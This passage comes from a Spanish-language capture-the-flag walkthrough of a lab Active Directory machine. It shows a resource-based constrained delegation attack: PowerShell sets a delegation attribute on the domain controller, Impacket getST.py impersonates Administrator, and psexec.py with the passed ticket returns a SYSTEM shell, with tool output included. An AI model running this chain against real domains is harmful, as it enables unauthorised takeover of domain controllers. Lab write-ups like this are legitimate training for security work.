$ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

~~~

Por último, asignamos el atributo que le permite a la cuenta `SERVICEA` actuar como otro usuario (`msds-allowedtoactonbehalfofotheridentity`)

~~~ bash
Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
~~~

Verificaremos que la configuración se ha aplicado correctamente para llevar a cabo el ataque

~~~ bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
~~~

### RBCD - Getting a Service Ticket

Como ya tenemos permisos de delegación, utilizaremos el protocolo `S4U2Self` para obtener un TGS a nombre del usuario `Administrator`, para posteriormente conectarnos

~~~ bash
getST.py -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/SERVICEA$:123456      
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
~~~


## PassTheTicket - `Administrator`

Ya hemos guardado el ticket en el archivo `Administrator.ccache`, para conectarnos necesitaremos exportar este archivo como una variable de entorno `KRB5CCNAME`

~~~ bash
export KRB5CCNAME=Administrator.ccache
psexec.py -k DC.support.htb                                                                
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on DC.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file iLFNScvL.exe
[*] Opening SVCManager on DC.support.htb.....
[*] Creating service uAZY on DC.support.htb.....
[*] Starting service uAZY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
~~~


